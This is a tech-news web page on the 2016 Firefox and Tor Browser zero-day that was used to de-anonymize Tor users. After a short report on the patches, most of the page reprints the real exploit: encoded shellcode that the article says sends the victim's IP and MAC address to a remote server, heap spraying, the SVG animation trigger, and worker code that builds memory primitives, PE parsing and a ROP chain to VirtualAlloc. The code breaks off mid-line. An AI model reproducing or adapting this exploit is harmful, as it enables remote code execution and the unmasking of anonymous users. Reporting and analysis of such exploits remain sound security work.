<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Mozilla and Tor closed a critical vulnerability that was actively used to de-anonymize Tor users.</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The developers of Mozilla and Tor urgently posted patches for browsers that eliminate the critical 0day vulnerability of the browser under Windows, Ma...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Mozilla and Tor closed a critical vulnerability that was actively used to de-anonymize Tor users.</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/6ff/284/6e7/6ff2846e7fa80ecca5d76ae4e00d85cb.png"><br><br>  The developers of Mozilla and Tor urgently posted patches for browsers that eliminate the critical 0day vulnerability of the browser under Windows, Mac and Linux.  According <a href="http://arstechnica.com/security/2016/11/firefox-0day-used-against-tor-users-almost-identical-to-one-fbi-used-in-2013/">to an</a> independent expert, the new exploit is almost exactly identical to the <a href="https://tsyrklevich.net/tbb_payload.txt">exploit for the 0day vulnerability of 2013</a> (execution of an arbitrary code after loading a specially crafted JS script into the browser), which the FBI successfully used to de-anonymize Tor users, including visiting child pornography sites. . <br><a name="habracut"></a><br>  ‚ÄúAn urgent patch has been released for a security vulnerability that has already been actively used against users under Windows,‚Äù said <a href="https://blog.torproject.org/blog/tor-browser-607-released">Tor</a> in an <a href="https://blog.torproject.org/blog/tor-browser-607-released">official statement</a> yesterday afternoon.  - At the moment, as far as we know, there are no such active exploits for OS X or Linux, this bug in itself applies to all platforms.  Therefore, we strongly recommend that all users immediately install the update for Tor Browser ‚Äù(an updated version of Firefox 45.5.1 ESR). <br><br>  Tor Browser is based on the open source code of the Firefox browser from the Mozilla Foundation.  Therefore, soon after the publication of the aforementioned blog post on the Tor blog, Mozilla security officer Daniel Veditz also <a href="https://blog.mozilla.org/security/2016/11/30/fixing-an-svg-animation-vulnerability/">made an</a> official announcement.  He said that the vulnerability is closed in the just released Firefox update on a stable channel. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Firefox update released very quickly.  Security experts received a copy of the exploit code on Wednesday morning.  In just a few hours, they prepared and released a patch. <br><br>  The vulnerability with remote code execution is triggered after the browser opens a specially crafted JS script that uses scalable vector graphics.  The exploit obtains the IP address and MAC address of the machine and sends it to a remote server, which is controlled by the attacker.  The code for this exploit has already been made <a href="https://bugzilla.mozilla.org/attachment.cgi%3Fid%3D8815435">publicly available</a> .  It first surfaced on the Tor mailing list: it was <a href="https://lists.torproject.org/pipermail/tor-talk/2016-November/042639.html">published there</a> on November 29, 2016 at 9:55:23 PM UTC. <br><br>  The exploit consists of a single HTML file and a single CSS file, which have been published on the mailing list in a deobfuscated form.  The exact functionality of the exploit could not be immediately determined, but it accesses VirtualAlloc in kernel32.dll and works from there. <br><br><div class="spoiler">  <b class="spoiler_title">HTML code</b> <div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> thecode =</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'\ue8fc\u0089\u0000\u8960\u31e5\u64d2\u528b\u8b30\u0c52\u528b\u8b14\u2872\ub70f\u264a\uff31\uc031\u3cac\u7c61\u2c02\uc120\u0dcf\uc701\uf0e2\u5752\u528b\u8b10\u3c42\ud001\u408b\u8578\u74c0\u014a\u50d0\u488b\u8b18\u2058\ud301\u3ce3\u8b49\u8b34\ud601\uff31\uc031\uc1ac\u0dcf\uc701\ue038\uf475\u7d03\u3bf8\u247d\ue275\u8b58\u2458\ud301\u8b66\u4b0c\u588b\u011c\u8bd3\u8b04\ud001\u4489\u2424\u5b5b\u5961\u515a\ue0ff\u5f58\u8b5a\ueb12\u5d86\u858d\u0297\u0000\u6850\u774c\u0726\ud5ff\uc085\u840f\u0185\u0000\u858d\u029e\u0000\u6850\u774c\u0726\ud5ff\uc085\u840f\u016f\u0000\u90bb\u0001\u2900\u54dc\u6853\u8029\u006b\ud5ff\udc01\uc085\u850f\u0155\u0000\u5050\u5050\u5040\u5040\uea68\udf0f\uffe0\u31d5\uf7db\u39d3\u0fc3\u3a84\u0001\u8900\u68c3\u2705\ue21b\u6866\u5000\uc931\uc180\u6602\u8951\u6ae2\u5210\u6853\ua599\u6174\ud5ff\uc085\u0874\u8dfe\u0248\u0000\ud775\u00b8\u0001\u2900\u89c4\u52e2\u5250\ub668\ude49\uff01\u5fd5\uc481\u0100\u0000\uc085\u850f\u00f6\u0000\ue857\u00fa\u0000\u895e\u8dca\ua7bd\u0002 \ue800\u00ec\u0000\u834f\u20fa\u057c\u20ba\u0000\u8900\u56d1\ua4f3\u0db9\u0000\u8d00\u8ab5\u0002\uf300\u89a4\u44bd\u0002\u5e00\u6856\u28a9\u8034\ud5ff\uc085\u840f'</span></span></span><span class="javascript"> + </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'\u00ae\u0000\u8b66\u0a48\u8366\u04f9\u820f\u00a0\u0000\u408d\u8b0c\u8b00\u8b08\ub809\u0100\u0000\u8950\u29e7\u89c4\u57e6\u5156\u6851\u7248\ub8d2\ud5ff\uc085\uc481\u0104\u0000\ub70f\u830f\u06f9\u7072\u06b9\u0000\ub800\u0010\u0000\uc429\ue789\uca89\ue2d1\u5250\ud231\u168a\ud088\uf024\ue8c0\u3c04\u7709\u0404\ueb30\u0402\u8837\u4707\ud088\u0f24\u093c\u0477\u3004\u02eb\u3704\u0788\u4647\ud4e2\u2959\u89cf\u58fe\uc401\ubd8b\u0244\u0000\ua4f3\u36e8\u0000\u3100\u50c0\u2951\u4fcf\u5357\uc268\u38eb\uff5f\uebd5\u6a09\u6800\u1347\u6f72\ud5ff\u6853\u6e75\u614d\ud5ff\uedeb\uc931\ud1f7\uc031\uaef2\ud1f7\uc349\u0000\u0000\u8d03\ua7bd\u0002\ue800\uffe4\uffff\ub94f\u004f\u0000\ub58d\u026e\u0000\ua4f3\ubd8d\u02a7\u0000\ucbe8\uffff\uc3ff\u0a0d\u6341\u6563\u7470\u452d\u636e\u646f\u6e69\u3a67\u6720\u697a\u0d70\u0d0a\u000a\u0a0d\u6f43\u6b6f\u6569\u203a\u434d\u773d\u3273\u335f\u0032\u5049\u4c48\u4150\u4950\u4700\u5445\u2f20\u6130\u3238\u6131\u3038\u302f\u6435\u3063\u3132\u2032\u5448\u5054\u312f\u312e\u0a0d\ u6f48\u7473\u203a\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u4190'</span></span></span><span class="javascript">; </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> worker = </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">new</span></span></span><span class="javascript"> Worker(</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'cssbanner.js'</span></span></span><span class="javascript">); worker.postMessage(thecode); </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> svgns = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'http://www.w3.org/2000/svg'</span></span></span><span class="javascript">; </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> heap80 = </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">new</span></span></span><span class="javascript"> </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">Array</span></span></span><span class="javascript">(</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0x1000</span></span></span><span class="javascript">); </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> heap100 = </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">new</span></span></span><span class="javascript"> </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">Array</span></span></span><span class="javascript">(</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0x4000</span></span></span><span class="javascript">); </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> block80 = </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">new</span></span></span><span class="javascript"> </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">ArrayBuffer</span></span></span><span class="javascript">(</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0x80</span></span></span><span class="javascript">); </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> block100 = </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">new</span></span></span><span class="javascript"> </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">ArrayBuffer</span></span></span><span class="javascript">(</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0x100</span></span></span><span class="javascript">); </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> sprayBase = </span><span class="hljs-literal"><span class="javascript"><span class="hljs-literal">undefined</span></span></span><span class="javascript">; </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> arrBase = </span><span class="hljs-literal"><span class="javascript"><span class="hljs-literal">undefined</span></span></span><span class="javascript">; </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> animateX = </span><span class="hljs-literal"><span class="javascript"><span class="hljs-literal">undefined</span></span></span><span class="javascript">; </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> containerA = </span><span class="hljs-literal"><span class="javascript"><span class="hljs-literal">undefined</span></span></span><span class="javascript">; </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">var</span></span></span><span class="javascript"> offset = </span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0x90</span></span></span><span class="javascript">; </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (</span><span class="hljs-regexp"><span class="javascript"><span class="hljs-regexp">/.*Firefox\/(4[7-9]|[5-9]\d+|[1-9]\d{2,})\..*/</span></span></span><span class="javascript">.test(navigator.userAgent)) { offset = </span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0x88</span></span></span><span class="javascript">; </span><span class="hljs-comment"><span class="javascript"><span class="hljs-comment">// versions 47.0 or greater } var $ = function(id) { return document.getElementById(id); } var exploit = function() { var u32 = new Uint32Array(block80) u32[0x2] = arrBase - offset; u32[0x8] = arrBase - offset; u32[0xE] = arrBase - offset; for(i = heap100.length/2; i &lt; heap100.length; i++) { heap100[i] = block100.slice(0) } for(i = 0; i &lt; heap80.length/2; i++) { heap80[i] = block80.slice(0) } animateX.setAttribute('begin', '59s') animateX.setAttribute('begin', '58s') for(i = heap80.length/2; i &lt; heap80.length; i++) { heap80[i] = block80.slice(0) } for(i = heap100.length/2; i &lt; heap100.length; i++) { heap100[i] = block100.slice(0) } animateX.setAttribute('begin', '10s') animateX.setAttribute('begin', '9s') window.dump('PAUSING!!! YAYA'); containerA.pauseAnimations(); } worker.onmessage = function(e) { worker.onmessage = function(e) { window.setTimeout(function() { worker.terminate(); document.body.innerHTML = ''; document.getElementsByTagName('head')[0].innerHTML = ''; document.body.setAttribute('onload', '') }, 1000); } arrBase = e.data; exploit(); } var idGenerator = function() { return 'id' + (((1+Math.random())*0x10000)|0).toString(16).substring(1); } var craftDOM = function() { containerA = document.createElementNS(svgns, 'svg') var containerB = document.createElementNS(svgns, 'svg'); animateX = document.createElementNS(svgns, 'animate') var animateA = document.createElementNS(svgns, 'animate') var animateB = document.createElementNS(svgns, 'animate') var animateC = document.createElementNS(svgns, 'animate') var idX = idGenerator(); var idA = idGenerator(); var idB = idGenerator(); var idC = idGenerator(); animateX.setAttribute('id', idX); animateA.setAttribute('id', idA); animateA.setAttribute('end', '50s'); animateB.setAttribute('id', idB); animateB.setAttribute('begin', '60s'); animateB.setAttribute('end', idC + '.end'); animateC.setAttribute('id', idC); animateC.setAttribute('begin', '10s'); animateC.setAttribute('end', idA + '.end'); containerA.appendChild(animateX) containerA.appendChild(animateA) containerA.appendChild(animateB) containerB.appendChild(animateC) document.body.appendChild(containerA); document.body.appendChild(containerB); } window.onload = craftDOM; // </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag">&gt;</span></span><span class="css"><span class="css"> </span><span class="hljs-selector-id"><span class="css"><span class="hljs-selector-id">#mtdiv</span></span></span><span class="css">{ </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">position</span></span></span><span class="css">: absolute; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">width</span></span></span><span class="css">: </span><span class="hljs-number"><span class="css"><span class="hljs-number">960px</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">height</span></span></span><span class="css">: </span><span class="hljs-number"><span class="css"><span class="hljs-number">166px</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">z-index</span></span></span><span class="css">: </span><span class="hljs-number"><span class="css"><span class="hljs-number">15</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">top</span></span></span><span class="css">: </span><span class="hljs-number"><span class="css"><span class="hljs-number">100px</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">left</span></span></span><span class="css">: </span><span class="hljs-number"><span class="css"><span class="hljs-number">50%</span></span></span><span class="css">; </span><span class="hljs-attribute"><span class="css"><span class="hljs-attribute">margin</span></span></span><span class="css">: </span><span class="hljs-number"><span class="css"><span class="hljs-number">0</span></span></span><span class="css"> </span><span class="hljs-number"><span class="css"><span class="hljs-number">0</span></span></span><span class="css"> </span><span class="hljs-number"><span class="css"><span class="hljs-number">0</span></span></span><span class="css"> -</span><span class="hljs-number"><span class="css"><span class="hljs-number">480px</span></span></span><span class="css">; } </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">bgcolor</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'#2F3236'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'mtdiv'</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'mt.png'</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> setTimeout(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'window.location = \'member.php\';'</span></span></span><span class="actionscript">, </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">2000</span></span></span><span class="actionscript">); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> </div></div><br><div class="spoiler">  <b class="spoiler_title">JS code (cssbanner.js)</b> <div class="spoiler_text"><pre> <code class="css hljs"><span class="hljs-selector-tag"><span class="hljs-selector-tag">self</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.onmessage</span></span> = <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">msg</span></span>) { thecode = msg.data; var pack = function (b) { var a = b &gt;&gt; 16; return String.fromCharCode(b &amp; 65535) + String.fromCharCode(a) }; <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Memory</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">f</span></span>){this._base_addr=b;this._read=a;this._write=f;this._abs_read=function(a){a&gt;=this._base_addr?a=this._read(a-this._base_addr):(a=4294967295-this._base_addr+1+a,a=this._read(a));return 0&gt;a?4294967295+a+1:a};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">._abs_write</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>){a&gt;=this._base_addr?this._write(a-this._base_addr,b):(a=4294967295-this._base_addr+1+a,this._write(a,b))};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readByte</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){return this.read(a)&amp;255};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readWord</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){return this.read(a)&amp;65535};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readDword</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){return this.read(a)}; <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.read</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>){if(a%4){var c=this._abs_read(a&amp;4294967292),d=this._abs_read(a+4&amp;4294967292),e=a%4;return c&gt;&gt;&gt;8*e|d&lt;&lt;8*(4-e)}<span class="hljs-selector-tag"><span class="hljs-selector-tag">return</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">._abs_read</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>)};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.readStr</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){for(var b="",c=0;;){if(32==c)return"";var d=this.readByte(a+c);if(0==d)break;b+=String.fromCharCode(d);c++}<span class="hljs-selector-tag"><span class="hljs-selector-tag">return</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.write</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){}} <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">PE</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){this.mem=b;this.export_table=this.module_base=void 0;this.export_table_size=0;this.import_table=void 0;this.import_table_size=0;this.find_module_base=function(a){for(a&amp;=4294901760;a;){if(23117==this.mem.readWord(a))return this.module_base=a;a-=65536}};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">._resolve_pe_structures</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(){peFile=this.module_base+this.mem.readWord(this.module_base+60);if(17744!=this.mem.readDword(peFile))throw"Bad NT Signature";this.pe_file=peFile;this.optional_header=this.pe_file+36;this.export_directory= this.module_base+this.mem.readDword(this.pe_file+120);this.export_directory_size=this.mem.readDword(this.pe_file+124);this.import_directory=this.module_base+this.mem.readDword(this.pe_file+128);this.import_directory_size=this.mem.readDword(this.pe_file+132)};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.resolve_imported_function</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>){void 0==this.import_directory&amp;&amp;this._resolve_pe_structures();for(var e=this.import_directory,c=e+this.import_directory_size;e&lt;c;){var d=this.mem.readStr(this.mem.readDword(e+12)+this.module_base);if(a.toUpperCase()== d.toUpperCase()){for(var c=this.mem.readDword(e)+this.module_base,e=this.mem.readDword(e+16)+this.module_base,d=this.mem.readDword(c),f=0;0!=d;){if(this.mem.readStr(d+this.module_base+2).toUpperCase()==b.toUpperCase())return this.mem.readDword(e+4*f);f++;d=this.mem.readDword(c+4*f)}<span class="hljs-selector-tag"><span class="hljs-selector-tag">break</span></span>}<span class="hljs-selector-tag"><span class="hljs-selector-tag">e</span></span>+=20}<span class="hljs-selector-tag"><span class="hljs-selector-tag">return</span></span> 0};<span class="hljs-selector-tag"><span class="hljs-selector-tag">void</span></span> 0!=<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>&amp;&amp;<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.find_module_base</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>)} <span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ROP</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){this.mem=b;this.pe=new PE(b,a);this.pe._resolve_pe_structures();this.module_base=this.pe.module_base+4096;this.findSequence=function(a){for(var b=0;;){for(var e=0,c=0;c&lt;a.length;c++)if(this.mem.readByte(this.module_base+b+c)==a[c]&amp;&amp;e==c)e++;else break;if(e==a.length)return this.module_base+b;b++}};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.findStackPivot</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(){return this.findSequence([148,195])};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.findPopRet</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){return this.findSequence([88,195])};<span class="hljs-selector-tag"><span class="hljs-selector-tag">this</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.ropChain</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">e</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">c</span></span>){c=void 0!=c?<span class="hljs-attribute"><span class="hljs-attribute">c</span></span>:new <span class="hljs-built_in"><span class="hljs-built_in">ArrayBuffer</span></span>(4096); c=new Uint32Array(c);var d=this.findStackPivot(),f=this.findPopRet("EAX"),g=this.pe.resolve_imported_function("kernel32.dll","VirtualAlloc");c[0]=f+1;c[1]=f;c[2]=a+b+4*e+4;c[3]=d;for(i=0;i&lt;e;i++)c[(b&gt;&gt;2)+i]=d;d=(b+4&gt;&gt;2)+e;c[d++]=g;c[d++]=a+(b+4*e+28);c[d++]=a;c[d++]=4096;c[d++]=4096;c[d++]=64;c[d++]=3435973836;return c}} <span class="hljs-selector-tag"><span class="hljs-selector-tag">var</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">conv</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ArrayBuffer</span></span>(8),<span class="hljs-selector-tag"><span class="hljs-selector-tag">convf64</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Float64Array</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">conv</span></span>),<span class="hljs-selector-tag"><span class="hljs-selector-tag">convu32</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">new</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">Uint32Array</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">conv</span></span>),<span class="hljs-selector-tag"><span class="hljs-selector-tag">qword2Double</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span class="hljs-selector-tag">b</span></span>,<span class="hljs-selector-tag"><span class="hljs-selector-tag">a</span></span>){convu32[0]=b;convu32[1]=a;return convf64[0]},<span class="hljs-selector-tag"><span class="hljs-selector-tag">doubleFromFloat</span></span>=<span class="hljs-selector-tag"><span class="hljs-selector-tag">function</span></span>(<span class="hljs-selector-tag"><span 